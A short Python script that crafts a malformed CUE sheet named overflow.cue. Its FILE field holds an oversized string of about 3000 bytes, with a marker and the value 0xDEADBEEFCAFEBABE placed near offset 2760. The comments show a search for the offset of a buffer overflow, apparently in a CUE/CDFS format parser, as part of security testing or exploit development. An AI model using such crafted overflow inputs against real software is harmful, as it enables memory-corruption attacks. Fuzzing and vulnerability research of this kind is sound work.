#!/usr/bin/env python3
import struct

# Try offset 2767 (35th cycle: 35*79 = 2765, +2 = 2767)
# Actually let's just try 2760-2770 range with a marker

payload = b"0" * 2760
payload += b"STARTXXX"  
payload += struct.pack("<Q", 0xDEADBEEFCAFEBABE)  
payload += b"ZZZZZZZZ"
payload += b"Y" * (3000 - len(payload))

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')
